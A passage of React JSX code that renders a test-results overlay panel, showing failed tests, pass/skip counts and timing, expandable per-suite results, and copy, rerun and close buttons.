            <div style={{ maxHeight: 160, overflowY: "auto", padding: "0 14px 8px" }}>
              {progress.results.filter((r) => r.pass === false).map((r, i) => (
                <div key={i} style={{ fontSize: 10, color: "#f87171", padding: "3px 0", lineHeight: 1.4 }}>
                  ✗ <span style={{ fontWeight: 600 }}>[{r.suite}]</span> {r.name}
                  {r.error && <div style={{ fontSize: 9, color: "#f87171", opacity: 0.7, paddingLeft: 12 }}>↳ {r.error}</div>}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Results panel */}
      {results && (
        <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: `1px solid ${failed > 0 ? "rgba(239,68,68,0.5)" : "rgba(16,185,129,0.5)"}`, boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", overflow: "hidden", maxHeight: expanded ? "80vh" : "auto", display: "flex", flexDirection: "column" }}>
          {/* Header */}
          <div onClick={() => setExpanded((v) => !v)} style={{ padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, cursor: "pointer", borderBottom: expanded ? "1px solid rgba(255,255,255,0.1)" : "none" }}>
            <span style={{ fontSize: 14 }}>{failed > 0 ? "❌" : "✅"}</span>
            <span style={{ fontSize: 12, fontWeight: 700, color: "#fff" }}>UI Tests: {passed}/{total}</span>
            {skippedCount > 0 && <span style={{ fontSize: 9, color: "#94a3b8", fontWeight: 600 }}>⏭️ {skippedCount} skipped</span>}
            <span style={{ fontSize: 9, color: "rgba(255,255,255,0.5)" }}>{(totalMs / 1000).toFixed(1)}s · v{VELA_VERSION}</span>
            <div style={{ flex: 1 }} />
            <button onClick={(e) => { e.stopPropagation(); copyResults(); }} style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)", color: "#fff", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontSize: 9, fontFamily: FONT.mono }}>{copied ? "Copied!" : "📋"}</button>
            <button onClick={(e) => { e.stopPropagation(); run(); }} style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)", color: "#fff", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontSize: 9, fontFamily: FONT.mono }}>🔄</button>
            <button onClick={(e) => { e.stopPropagation(); setResults(null); setExpanded(false); }} style={{ background: "none", border: "none", color: "rgba(255,255,255,0.4)", cursor: "pointer", fontSize: 12, padding: "0 2px" }}>✕</button>
          </div>

          {/* Expanded results */}
          {expanded && (
            <div style={{ overflowY: "auto", maxHeight: "60vh", padding: "6px 0" }}>
              {Object.entries(suites).map(([name, tests]) => {
                const suiteFailed = tests.filter((t) => t.pass === false).length;
                const suiteSkipped = tests.filter((t) => t.pass === "skip").length;
                const suitePassed = suiteFailed === 0;
                return (
                  <div key={name} style={{ padding: "4px 14px" }}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: suitePassed ? "#34d399" : "#f87171", padding: "4px 0", display: "flex", alignItems: "center", gap: 6 }}>
                      <span>{suitePassed ? "✅" : "❌"}</span>
                      <span>{name}</span>
                      <span style={{ fontSize: 8, color: "rgba(255,255,255,0.3)" }}>{tests.length} tests{suiteFailed > 0 ? `, ${suiteFailed} failed` : ""}{suiteSkipped > 0 ? `, ${suiteSkipped} skipped` : ""}</span>
                    </div>
                    {tests.map((t, i) => (
                      <div key={i} style={{ fontSize: 9, padding: "2px 0 2px 18px", color: t.pass === true ? "rgba(255,255,255,0.5)" : t.pass === "skip" ? "#94a3b8" : "#f87171", lineHeight: 1.5 }}>
                        {t.pass === true ? "✓" : t.pass === "skip" ? "⏭️" : "✗"} {t.name} <span style={{ color: "rgba(255,255,255,0.2)" }}>{t.ms}ms</span>
                        {t.error && <div style={{ color: t.pass === "skip" ? "#94a3b8" : "#f87171", fontSize: 8, paddingLeft: 12 }}>↳ {t.error}</div>}
                      </div>
                    ))}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
